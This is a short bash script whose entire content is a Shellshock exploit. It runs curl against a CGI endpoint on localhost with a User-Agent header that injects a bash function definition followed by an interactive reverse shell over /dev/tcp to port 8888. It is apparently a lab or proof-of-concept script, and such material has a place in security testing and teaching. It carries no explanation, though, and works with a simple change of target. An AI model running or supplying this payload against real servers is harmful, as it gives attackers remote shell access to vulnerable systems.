#!/bin/bash

curl -H "User-Agent: () { :; }; echo; /bin/bash -i > /dev/tcp/127.0.0.1/8888 0<&1 2>&1" "http://localhost/cgi-bin/myprog.cgi"
